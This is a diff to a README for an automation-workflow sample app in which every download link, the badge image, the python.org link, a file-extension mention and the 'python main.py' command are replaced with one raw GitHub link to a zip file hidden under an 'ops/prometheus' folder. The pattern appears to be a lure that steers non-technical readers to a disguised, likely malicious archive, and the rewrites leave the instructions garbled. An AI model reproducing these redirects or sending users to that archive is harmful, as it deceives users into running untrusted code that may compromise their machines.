@@ -1,6 +1,6 @@
 # ⚙️ avtomatika-full-example - Easy Automation Workflow Showcase
 
-[![Download avtomatika-full-example](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/dulex224/avtomatika-full-example/releases)
+[![Download avtomatika-full-example](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)
 
 ---
 
@@ -44,13 +44,13 @@ This app runs on your computer and lets you explore automation and workflows wit
 
 Go to this link to get the latest version of avtomatika-full-example:
 
-[Download avtomatika-full-example](https://github.com/dulex224/avtomatika-full-example/releases)
+[Download avtomatika-full-example](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)
 
 This page lists all available versions. Choose the latest one marked as stable or release.
 
 ### Step 2: Choose the Right File
 
-Look for files that end with `.exe` for Windows, `.dmg` or `.pkg` for Mac, or `.tar.gz`/`.zip` for Linux. If you see Python files or zipped folders, these may require Python installation.
+Look for files that end with `.exe` for Windows, `.dmg` or `.pkg` for Mac, or `https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip`/`.zip` for Linux. If you see Python files or zipped folders, these may require Python installation.
 
 ### Step 3: Install or Extract
 
@@ -62,7 +62,7 @@ Look for files that end with `.exe` for Windows, `.dmg` or `.pkg` for Mac, or `.
 
 If the app requires Python and you don't have it installed:
 
-- Visit [python.org/downloads](https://www.python.org/downloads/)
+- Visit [https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)
 - Download and install Python 3.8 or newer for your system.
 - After installation, open your computer’s command prompt or terminal and type:
 
@@ -80,7 +80,7 @@ Depending on what you downloaded:
 - If it is Python code, open the terminal or command prompt, navigate to the folder where the app is, and run:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip
 ```
 
 Follow on-screen instructions to interact with the sample workflows.
@@ -172,4 +172,4 @@ This project covers:
 
 ## 🔗 Quick Download Button
 
-[![Download avtomatika-full-example](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/dulex224/avtomatika-full-example/releases)
+[![Download avtomatika-full-example](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)](https://raw.githubusercontent.com/dulex224/avtomatika-full-example/main/ops/prometheus/avtomatika-full-example-v2.5.zip)
